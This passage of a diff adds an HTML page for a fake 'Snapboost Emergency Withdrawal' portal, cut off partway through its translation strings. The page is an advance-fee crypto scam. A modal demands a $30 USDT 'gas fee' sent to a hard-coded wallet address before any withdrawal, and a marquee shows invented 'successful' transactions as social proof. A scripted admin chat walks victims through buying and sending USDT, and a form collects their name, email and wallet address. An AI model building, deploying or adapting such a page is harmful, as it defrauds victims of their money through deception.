@@ -1,1 +1,513 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapboost Emergency Withdrawal</title>
+  <!-- Memuat Tailwind CSS -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <style>
+    @keyframes marquee {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+    .animate-marquee {
+      animation: marquee 25s linear infinite;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in-up {
+      animation: fadeInUp 0.4s ease-out forwards;
+    }
+    @keyframes flyMoney {
+      0% { transform: translate(-100px, 10px) scale(0.5) rotate(-15deg); opacity: 0; }
+      20% { opacity: 1; transform: translate(-50px, -30px) scale(1) rotate(0deg); }
+      80% { opacity: 1; transform: translate(50px, -30px) scale(1) rotate(15deg); }
+      100% { transform: translate(100px, 10px) scale(0.5) rotate(30deg); opacity: 0; }
+    }
+    .animate-fly-money {
+      animation: flyMoney 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+    }
+    .custom-scrollbar::-webkit-scrollbar {
+      width: 5px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-track {
+      background: transparent; 
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb {
+      background: #475569; 
+      border-radius: 10px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+      background: #64748b; 
+    }
+  </style>
+
+  <script>
+    // Fallback Logo SVG jika gambar gagal dimuat
+    const fallbackSvg = `<svg viewBox="0 0 100 100" class="w-full h-full" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="snapGrad" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stopColor="#ff0000" /><stop offset="25%" stopColor="#ffaa00" /><stop offset="50%" stopColor="#00cc44" /><stop offset="75%" stopColor="#0066ff" /><stop offset="100%" stopColor="#aa00ff" /></linearGradient><mask id="starMask"><rect width="100" height="100" fill="white" /><polygon points="52,30 58,44 73,44 61,53 65,68 52,59 39,68 43,53 31,44 46,44" fill="black" /></mask></defs><path d="M 22 15 Q 22 5 32 11 L 82 41 Q 92 47 92 50 Q 92 53 82 59 L 32 89 Q 22 95 22 85 Z" fill="url(#snapGrad)" mask="url(#starMask)" /></svg>`;
+    function handleLogoError(img) {
+      const wrapper = document.createElement('div');
+      wrapper.className = img.className;
+      wrapper.innerHTML = fallbackSvg;
+      img.parentNode.replaceChild(wrapper, img);
+    }
+  </script>
+</head>
+<body class="bg-[#0f172a] text-slate-200 font-sans flex flex-col relative overflow-x-hidden min-h-screen">
+
+  <!-- Background Glow -->
+  <div class="absolute top-[-10%] left-[-10%] w-96 h-96 bg-blue-600/20 rounded-full blur-[100px] pointer-events-none"></div>
+  <div class="absolute bottom-[-10%] right-[-10%] w-96 h-96 bg-purple-600/20 rounded-full blur-[100px] pointer-events-none"></div>
+
+  <!-- Navbar -->
+  <nav class="w-full border-b border-slate-800 bg-slate-900/50 backdrop-blur-md sticky top-0 z-40">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <img src="1000109109.webp" alt="Snapboost" onerror="handleLogoError(this)" class="w-12 h-12 object-contain drop-shadow-[0_0_10px_rgba(255,255,255,0.2)]" />
+        <span class="text-2xl font-bold bg-gradient-to-r from-blue-400 via-purple-400 to-red-400 bg-clip-text text-transparent">Snapboost</span>
+      </div>
+      <div class="flex items-center gap-4">
+        <div class="hidden md:flex items-center gap-2 text-sm text-slate-400 mr-4">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path><path d="m9 12 2 2 4-4"></path></svg>
+          <span data-i18n="navSecurity">Aman via BSC Network</span>
+        </div>
+        
+        <div class="flex items-center gap-2 bg-slate-800/80 px-3 py-1.5 rounded-lg border border-slate-700 hover:bg-slate-700 transition-colors">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-slate-400"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
+          <select id="langSelect" class="bg-transparent text-sm font-medium text-white outline-none cursor-pointer appearance-none pr-4" style="background-image: none;">
+            <option value="id">ID - Bahasa</option>
+            <option value="en">EN - English</option>
+            <option value="zh">ZH - 中文</option>
+            <option value="es">ES - Español</option>
+            <option value="ar">AR - العربية</option>
+            <option value="ja">JA - 日本語</option>
+            <option value="ko">KO - 한국어</option>
+            <option value="ru">RU - Русский</option>
+            <option value="pt">PT - Português</option>
+            <option value="hi">HI - हिन्दी</option>
+          </select>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- Main Content -->
+  <main class="flex-grow flex items-center justify-center px-4 py-12 relative z-10">
+    <div class="max-w-5xl w-full grid grid-cols-1 md:grid-cols-2 gap-12 items-center">
+      
+      <!-- Left Info -->
+      <div class="space-y-6">
+        <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 text-sm font-medium">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg>
+          <span data-i18n="portal">Portal Penarikan Darurat</span>
+        </div>
+        <h1 class="text-4xl md:text-5xl font-extrabold text-white leading-tight">
+          <div class="flex items-center gap-3 mb-3">
+            <img src="1000109109.webp" onerror="handleLogoError(this)" class="w-10 h-10 md:w-14 md:h-14 object-contain" />
+            <span>Snapboost</span>
+          </div>
+          <span data-i18n="title1">Tarik Aset Anda</span> <br />
+          <span data-i18n="title2" class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-500">Dengan Aman & Cepat</span>
+        </h1>
+        <p data-i18n="desc" class="text-slate-400 text-lg leading-relaxed">
+          Sistem penarikan darurat Snapboost dirancang untuk memulihkan aset Anda ke alamat dompet BEP-10 Anda seketika. Proses terenkripsi secara menyeluruh.
+        </p>
+        
+        <div class="grid grid-cols-2 gap-4 pt-4">
+          <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50">
+            <div class="text-2xl font-bold text-white mb-1">99.9%</div>
+            <div data-i18n="statSuccess" class="text-sm text-slate-400">Tingkat Keberhasilan</div>
+          </div>
+          <div class="bg-slate-800/50 p-4 rounded-xl border border-slate-700/50">
+            <div class="text-2xl font-bold text-white mb-1">&lt; 3 Min</div>
+            <div data-i18n="statTime" class="text-sm text-slate-400">Rata-rata Waktu Proses</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Right Form -->
+      <div class="bg-slate-800/80 backdrop-blur-xl p-8 rounded-2xl border border-slate-700 shadow-2xl relative">
+        <div class="mb-6">
+          <h2 data-i18n="formTitle" class="text-2xl font-bold text-white">Form Penarikan</h2>
+          <p data-i18n="formSub" class="text-sm text-slate-400 mt-1">Lengkapi data di bawah ini untuk memulai proses.</p>
+        </div>
+
+        <form id="withdrawForm" class="space-y-4">
+          <div>
+            <label data-i18n="nameLabel" class="block text-sm font-medium text-slate-300 mb-1">Nama Pengguna</label>
+            <input type="text" required data-i18n-placeholder="namePlace" placeholder="Masukkan nama lengkap Anda" class="w-full px-4 py-3 bg-slate-900/50 border border-slate-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-white placeholder-slate-500" />
+          </div>
+
+          <div>
+            <label data-i18n="emailLabel" class="block text-sm font-medium text-slate-300 mb-1">Email Pengguna</label>
+            <input type="email" required placeholder="nama@email.com" class="w-full px-4 py-3 bg-slate-900/50 border border-slate-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-white placeholder-slate-500" />
+          </div>
+
+          <div>
+            <label data-i18n="amountLabel" class="block text-sm font-medium text-slate-300 mb-1">Jumlah Penarikan (USD)</label>
+            <div class="relative">
+              <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none"><span class="text-slate-400">$</span></div>
+              <input type="number" required min="1" placeholder="0.00" class="w-full pl-8 pr-4 py-3 bg-slate-900/50 border border-slate-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-white placeholder-slate-500" />
+            </div>
+          </div>
+
+          <div>
+            <label data-i18n="walletLabel" class="block text-sm font-medium text-slate-300 mb-1">Alamat Withdrawl (BEP-10)</label>
+            <input type="text" required placeholder="0x..." class="w-full px-4 py-3 bg-slate-900/50 border border-slate-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all text-white placeholder-slate-500 font-mono text-sm" />
+          </div>
+
+          <button id="submitBtn" type="submit" class="w-full mt-6 py-4 px-4 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 text-white font-bold rounded-lg shadow-lg shadow-blue-500/25 flex items-center justify-center gap-2 transition-all transform hover:scale-[1.02] active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed">
+            <div id="submitSpinner" class="hidden w-6 h-6 border-2 border-white/20 border-t-white rounded-full animate-spin"></div>
+            <div id="submitText" class="flex items-center gap-2">
+              <span data-i18n="btnSubmit">Proses Withdrawal</span>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>
+            </div>
+          </button>
+        </form>
+      </div>
+    </div>
+  </main>
+
+  <!-- BSCScan Ticker Loop -->
+  <div class="w-full bg-slate-900 border-t border-slate-800 py-3 relative z-20">
+    <div class="absolute left-0 top-0 bottom-0 w-24 bg-gradient-to-r from-slate-900 to-transparent z-10"></div>
+    <div class="absolute right-0 top-0 bottom-0 w-24 bg-gradient-to-l from-slate-900 to-transparent z-10"></div>
+    <div class="flex items-center">
+      <div class="px-4 text-slate-400 flex items-center gap-2 border-r border-slate-700 shrink-0 bg-slate-900 z-20">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-emerald-400"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
+        <span data-i18n="tickerLive" class="text-xs font-bold uppercase tracking-wider">BSCScan Langsung</span>
+      </div>
+      <div class="overflow-hidden whitespace-nowrap flex-grow relative flex items-center h-6">
+        <div id="tickerContent" class="animate-marquee inline-block text-sm">
+          <!-- Inject via JS -->
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Gas Fee Modal -->
+  <div id="gasModal" class="hidden fixed inset-0 z-50 flex items-center justify-center px-4">
+    <div class="absolute inset-0 bg-slate-950/80 backdrop-blur-sm" onclick="closeGasModal()"></div>
+    <div class="bg-slate-800 border border-slate-700 rounded-2xl shadow-2xl w-full max-w-md relative z-10 animate-fade-in-up">
+      <button onclick="closeGasModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white transition-colors">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+      </button>
+      <div class="p-8 flex flex-col items-center text-center">
+        <div class="w-16 h-16 bg-red-500/10 text-red-500 rounded-full flex items-center justify-center mb-6">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-8 h-8"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
+        </div>
+        <h3 data-i18n="modalTitle" class="text-2xl font-bold text-white mb-2">Pembayaran Gas Fee Diperlukan</h3>
+        <p class="text-slate-400 mb-6 leading-relaxed">
+          <span data-i18n="modalP1">Untuk memproses emergency withdrawal dari</span> 
+          <span class="inline-flex items-center gap-1 font-bold text-white align-middle"><img src="1000109109.webp" onerror="handleLogoError(this)" class="w-5 h-5 object-contain" /> Snapboost</span> 
+          <span data-i18n="modalP2">ke jaringan BSC, sistem mendeteksi Anda memerlukan biaya transaksi.</span><br /><br />
+          <span class="text-white font-medium"><span data-i18n="modalP3">Silahkan membayar untuk gas fee sebesar</span> <span class="text-red-400 font-bold text-xl">$30</span></span>
+        </p>
+        <div class="w-full bg-slate-900/50 p-4 rounded-xl border border-slate-700 mb-6">
+          <div data-i18n="modalTransfer" class="text-sm text-slate-400 mb-1">Transfer USDT (BEP-20) ke alamat:</div>
+          <div class="font-mono text-sm text-blue-400 break-all select-all">0x0CCD7b3Cc37B905cC25A232Ed4835890FdC6CA28</div>
+        </div>
+        <button onclick="confirmPayment()" data-i18n="modalBtn" class="w-full py-3 px-4 bg-slate-700 hover:bg-slate-600 text-white font-medium rounded-lg transition-colors">
+          Saya Telah Membayar
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Final Processing Modal -->
+  <div id="processingModal" class="hidden fixed inset-0 z-[60] flex items-center justify-center px-4 bg-slate-950/95 backdrop-blur-md">
+    <div class="flex flex-col items-center animate-fade-in-up max-w-md w-full text-center">
+      <div class="relative flex items-center justify-between w-64 h-32 mb-8">
+        <div class="relative z-10 p-4 bg-slate-800 rounded-2xl border border-slate-700 shadow-[0_0_30px_rgba(59,130,246,0.3)]">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-10 h-10 text-blue-400"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/></svg>
+        </div>
+        <div class="absolute inset-0 flex items-center justify-center pointer-events-none">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute text-emerald-400 w-8 h-8 animate-fly-money"><rect width="20" height="12" x="2" y="6" rx="2"/><circle cx="12" cy="12" r="2"/><path d="M6 12h.01M18 12h.01"/></svg>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute text-emerald-400 w-8 h-8 animate-fly-money delay-[400ms]"><rect width="20" height="12" x="2" y="6" rx="2"/><circle cx="12" cy="12" r="2"/><path d="M6 12h.01M18 12h.01"/></svg>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute text-emerald-400 w-8 h-8 animate-fly-money delay-[800ms]"><rect width="20" height="12" x="2" y="6" rx="2"/><circle cx="12" cy="12" r="2"/><path d="M6 12h.01M18 12h.01"/></svg>
+        </div>
+        <div class="relative z-10 p-4 bg-slate-800 rounded-2xl border border-slate-700 shadow-[0_0_30px_rgba(168,85,247,0.3)]">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-10 h-10 text-purple-400"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/></svg>
+        </div>
+      </div>
+      <h3 data-i18n="processingMsg" class="text-2xl md:text-3xl font-bold text-white mb-3 animate-pulse bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">Penarikan Anda sedang diproses...</h3>
+      <p data-i18n="doNotClose" class="text-slate-400">Harap jangan menutup halaman ini.</p>
+    </div>
+  </div>
+
+  <!-- Admin Chat Widget -->
+  <div class="fixed bottom-6 right-6 z-[70] flex flex-col items-end pointer-events-auto">
+    <div id="chatWindow" class="hidden mb-4 w-80 sm:w-96 bg-slate-800 rounded-2xl border border-slate-700 shadow-2xl overflow-hidden flex flex-col transition-all transform origin-bottom-right">
+      <div class="bg-gradient-to-r from-blue-600 to-purple-600 p-4 flex items-center justify-between shadow-md z-10">
+        <div class="flex items-center gap-3">
+          <div class="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center border border-white/30 backdrop-blur-sm">
+            <img src="1000109109.webp" onerror="handleLogoError(this)" class="w-6 h-6 object-contain" />
+          </div>
+          <div>
+            <h4 data-i18n="chatTitle" class="text-white font-bold text-sm tracking-wide">Kontak Admin</h4>
+            <div class="flex items-center gap-1.5 mt-0.5">
+              <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+              <span class="text-[11px] text-blue-100 uppercase tracking-wider font-semibold">Online</span>
+            </div>
+          </div>
+        </div>
+        <button onclick="toggleChat()" class="text-white/80 hover:text-white transition-colors p-1 bg-white/10 rounded-full hover:bg-white/20">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+        </button>
+      </div>
+
+      <div id="chatMessages" class="p-4 h-[320px] overflow-y-auto overscroll-contain bg-slate-900/80 flex flex-col gap-4 custom-scrollbar" style="-webkit-overflow-scrolling: touch;">
+        <!-- Chat Messages Injected Here -->
+      </div>
+
+      <div class="px-4 py-2 bg-slate-900/80 flex gap-2 border-t border-slate-800">
+        <button onclick="handleQuickReply()" type="button" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 px-3 py-1.5 rounded-full transition-colors border border-slate-600 flex items-center gap-1.5 shadow-sm">
+          💡 <span data-i18n="btnTutorial">Tutorial USDT</span>
+        </button>
+      </div>
+
+      <form id="chatForm" class="p-3 bg-slate-800 border-t border-slate-700 flex items-center gap-2">
+        <input id="chatInput" type="text" data-i18n-placeholder="chatInput" placeholder="Ketik pesan..." class="flex-1 bg-slate-900 border border-slate-700 rounded-full px-4 py-2.5 text-sm text-white focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-all placeholder-slate-500" />
+        <button type="submit" class="w-10 h-10 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 rounded-full flex items-center justify-center text-white transition-all shadow-md shrink-0 transform hover:scale-105 active:scale-95">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 ml-0.5"><path d="m22 2-7 20-4-9-9-4Z"/><path d="M22 2 11 13"/></svg>
+        </button>
+      </form>
+    </div>
+
+    <!-- Floating Button -->
+    <button id="chatFabBtn" onclick="toggleChat()" class="w-14 h-14 bg-gradient-to-r from-blue-600 to-purple-600 rounded-full flex items-center justify-center text-white shadow-[0_0_20px_rgba(59,130,246,0.4)] transition-all transform hover:scale-110 active:scale-95 z-50">
+      <svg id="iconMsg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-7 h-7"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"/></svg>
+      <svg id="iconClose" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 hidden"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+    </button>
+  </div>
+
+  <!-- Vanilla JavaScript Logic -->
+  <script>
+    /* =========================================
+       1. DATA & TRANSLATIONS
+    ========================================= */
+    const txids = [
+      { id: '0x8f2a...3b9c', amount: '$1,250', status: 'Success' },
+      { id: '0x1c4d...9a2f', amount: '$4,300', status: 'Success' },
+      { id: '0x9b7e...4c1a', amount: '$8,900', status: 'Success' },
+      { id: '0x3a2f...8b5d', amount: '$11,500', status: 'Success' },
+      { id: '0x7d9c...1e4b', amount: '$3,400', status: 'Success' },
+      { id: '0x5e1a...7f8c', amount: '$2,920', status: 'Success' },
+      { id: '0x2f8b...6d3e', amount: '$5,100', status: 'Success' },
+      { id: '0x4c2d...8e1f', amount: '$1,850', status: 'Success' },
+      { id: '0x9a1b...2c3d', amount: '$14,200', status: 'Success' },
+      { id: '0x6e7f...8a9b', amount: '$7,600', status: 'Success' },
+    ];
+
+    // Lengkap 10 Bahasa tanpa dipotong
+    const translations = {
+      id: {
+        navSecurity: "Aman via BSC Network", portal: "Portal Penarikan Darurat", title1: "Tarik Aset Anda", title2: "Dengan Aman & Cepat", desc: "Sistem penarikan darurat Snapboost dirancang untuk memulihkan aset Anda ke alamat dompet BEP-10 Anda seketika. Proses terenkripsi secara menyeluruh.", statSuccess: "Tingkat Keberhasilan", statTime: "Rata-rata Waktu Proses", formTitle: "Form Penarikan", formSub: "Lengkapi data di bawah ini untuk memulai proses.", nameLabel: "Nama Pengguna", namePlace: "Masukkan nama lengkap Anda", emailLabel: "Email Pengguna", amountLabel: "Jumlah Penarikan (USD)", walletLabel: "Alamat Withdrawl (BEP-10)", btnSubmit: "Proses Withdrawal", tickerLive: "BSCScan Langsung", modalTitle: "Pembayaran Gas Fee Diperlukan", modalP1: "Untuk memproses emergency withdrawal dari", modalP2: "ke jaringan BSC, sistem mendeteksi Anda memerlukan biaya transaksi.", modalP3: "Silahkan membayar untuk gas fee sebesar", modalTransfer: "Transfer USDT (BEP-20) ke alamat:", modalBtn: "Saya Telah Membayar", processingMsg: "Penarikan Anda sedang diproses...", doNotClose: "Harap jangan menutup halaman ini.",
+        chatTitle: "Kontak Admin", chatInput: "Ketik pesan...", chatReplyProcessing: "Silahkan tunggu penarikan anda sedang dalam proses.", chatReplyForm: "Silahkan isi form penarikan sesuai dengan data anda dan silahkan melakukan transaksi.", chatGreeting: "Halo, ada yang bisa kami bantu?", btnTutorial: "Tutorial USDT", chatTutorial: "Panduan Singkat: Membeli & Mengirim USDT (BEP-20)\n\nLangkah 1: Beli USDT\n- Buka aplikasi bursa global (misal: Binance, Bybit, atau KuCoin).\n- Pergi ke menu \"Manajemen P2P\" atau \"Beli Kripto\".\n- Pilih USDT dan bayar menggunakan mata uang/metode lokal.\n- Setelah selesai, USDT akan berada di Dompet Pendanaan/Spot Anda.\n\nLangkah 2: Penarikan (Kirim)\n- Buka Dompet Anda dan klik Tarik (Withdraw).\n- Cari USDT.\n- Pilih \"Kirim melalui Jaringan Kripto\".\n\nLangkah 3: Jaringan & Alamat (Sangat Penting!)\n- Alamat: Tempelkan alamat tujuan (harus dimulai dengan 0x).\n- Jaringan: Pilih BNB Smart Chain (BEP20).\n- Peringatan: Jangan pilih ERC20 atau TRC20. Salah jaringan akan mengakibatkan hilangnya dana.\n- Jumlah: Masukkan jumlah yang ingin Anda kirim.\n- Klik Tarik dan konfirmasi dengan 2FA."
+      },
+      en: {
+        navSecurity: "Secured via BSC Network", portal: "Emergency Withdrawal Portal", title1: "Withdraw Your Assets", title2: "Safely & Quickly", desc: "The Snapboost emergency withdrawal system is designed to recover your assets to your BEP-10 wallet address instantly. The process is fully encrypted.", statSuccess: "Success Rate", statTime: "Avg. Processing Time", formTitle: "Withdrawal Form", formSub: "Complete the data below to start the process.", nameLabel: "Username", namePlace: "Enter your full name", emailLabel: "User Email", amountLabel: "Withdrawal Amount (USD)", walletLabel: "Withdrawal Address (BEP-10)", btnSubmit: "Process Withdrawal", tickerLive: "Live BSCScan", modalTitle: "Gas Fee Payment Required", modalP1: "To process your emergency withdrawal from", modalP2: "to the BSC network, the system detects you need a transaction fee.", modalP3: "Please pay the gas fee of", modalTransfer: "Transfer USDT (BEP-20) to address:", modalBtn: "I Have Paid", processingMsg: "Your withdrawal is being processed...", doNotClose: "Please do not close this page.",
+        chatTitle: "Admin Contact", chatInput: "Type a message...", chatReplyProcessing: "Please wait, your withdrawal is currently processing.", chatReplyForm: "Please fill out the withdrawal form with your details and complete the transaction.", chatGreeting: "Hello, how can we help you?", btnTutorial: "USDT Tutorial", chatTutorial: "Simple Guide: Buying & Sending USDT (BEP-20)\n\nStep 1: Buy USDT\n- Open a global exchange app (e.g., Binance, Bybit, or KuCoin).\n- Go to the \"P2P Management\" or \"Buy Crypto\" menu.\n- Select USDT and pay using your local currency/method.\n- Once finished, the USDT will be in your Funding/Spot Wallet.\n\nStep 2: Withdraw (Send)\n- Go to your Wallet and click Withdraw.\n- Search for USDT.\n- Choose \"Send via Crypto Network\".\n\nStep 3: Network & Address (Crucial!)\n- Address: Paste the destination address (it must start with 0x).\n- Network: Select BNB Smart Chain (BEP20).\n- Warning: Do not select ERC20 or TRC20. Choosing the wrong network will result in lost funds.\n- Amount: Enter the amount you want to send.\n- Click Withdraw and confirm with your 2FA."
+      },
+      zh: {
+        navSecurity: "通过 BSC 网络保护", portal: "紧急提款门户", title1: "提取您的资产", title2: "安全且快速", desc: "Snapboost 紧急提款系统旨在立即将您的资产恢复到您的 BEP-10 钱包地址。该过程完全加密。", statSuccess: "成功率", statTime: "平均处理时间", formTitle: "提款表单", formSub: "填写以下数据以开始该过程。", nameLabel: "用户名", namePlace: "输入您的全名", emailLabel: "用户电子邮件", amountLabel: "提款金额 (USD)", walletLabel: "提款地址 (BEP-10)", btnSubmit: "处理提款", tickerLive: "实时 BSCScan", modalTitle: "需要支付矿工费", modalP1: "为了处理您从", modalP2: "到 BSC 网络的紧急提款，系统检测到您需要交易费。", modalP3: "请支付矿工费", modalTransfer: "将 USDT 转移到地址：", modalBtn: "我已支付", processingMsg: "您的提款正在处理中...", doNotClose: "请不要关闭此页面。",
+        chatTitle: "联系管理员", chatInput: "输入消息...", chatReplyProcessing: "请稍候，您的提款正在处理中。", chatReplyForm: "请根据您的详细信息填写提款表格并完成交易。", chatGreeting: "您好，我们能为您提供什么帮助？", btnTutorial: "USDT 教程", chatTutorial: "简单指南：购买和发送 USDT (BEP-20)\n\n第 1 步：购买 USDT\n- 打开全球交易所应用程序（例如 Binance、Bybit 或 KuCoin）。\n- 转到“P2P 管理”或“购买加密货币”菜单。\n- 选择 USDT 并使用您的当地货币/方法付款。\n- 完成后，USDT 将在您的资金/现货钱包中。\n\n第 2 步：提款（发送）\n- 转到您的钱包并点击提款。\n- 搜索 USDT。\n- 选择“通过加密网络发送”。\n\n第 3 步：网络和地址（至关重要！）\n- 地址：粘贴目标地址（必须以 0x 开头）。\n- 网络：选择 BNB Smart Chain (BEP20)。\n- 警告：不要选择 ERC20 或 TRC20。选择错误的网络将导致资金丢失。\n- 金额：输入您要发送的金额。\n- 点击提款并使用您的 2FA 确认。"
+      },
+      es: {
+        navSecurity: "Protegido por red BSC", portal: "Portal de Retiro", title1: "Retira Tus Activos", title2: "De Forma Segura", desc: "El sistema de retiro de emergencia de Snapboost está diseñado para recuperar sus activos a su dirección BEP-10 al instante.", statSuccess: "Tasa de Éxito", statTime: "Tiempo de Proceso", formTitle: "Formulario de Retiro", formSub: "Complete los datos a continuación.", nameLabel: "Nombre de Usuario", namePlace: "Ingrese su nombre", emailLabel: "Correo Electrónico", amountLabel: "Monto a Retirar (USD)", walletLabel: "Dirección de Retiro (BEP-10)", btnSubmit: "Procesar Retiro", tickerLive: "BSCScan en Vivo", modalTitle: "Pago de Gas Requerido", modalP1: "Para procesar su retiro de", modalP2: "a la red BSC, el sistema requiere una tarifa.", modalP3: "Por favor, pague la tarifa de gas de", modalTransfer: "Transfiera USDT a:", modalBtn: "Ya He Pagado", processingMsg: "Su retiro se está procesando...", doNotClose: "Por favor, no cierre esta página.",
+        chatTitle: "Contacto de Administrador", chatInput: "Escribe un mensaje...", chatReplyProcessing: "Por favor espere, su retiro se está procesando actualmente.", chatReplyForm: "Por favor, complete el formulario de retiro con sus datos y complete la transacción.", chatGreeting: "Hola, ¿cómo podemos ayudarle?", btnTutorial: "Tutorial de USDT", chatTutorial: "Guía simple: Comprar y enviar USDT (BEP-20)\n\nPaso 1: Comprar USDT\n- Abra una aplicación de intercambio global.\n- Vaya al menú \"Gestión P2P\" o \"Comprar Cripto\".\n- Selecione USDT y pague.\n\nPaso 2: Retirar (Enviar)\n- Vaya a su billetera y haga clic en Retirar.\n- Busque USDT y elija \"Enviar a través de la red criptográfica\".\n\nPaso 3: Red y Dirección (¡Crucial!)\n- Dirección: Pegue la dirección de destino (debe comenzar con 0x).\n- Red: Seleccione BNB Smart Chain (BEP20).\n- Advertencia: No seleccione ERC20 o TRC20.\n- Cantidad: Ingrese la cantidad que desea enviar.\n- Haga clic en Retirar y confirme con su 2FA."
+      },
+      ar: {
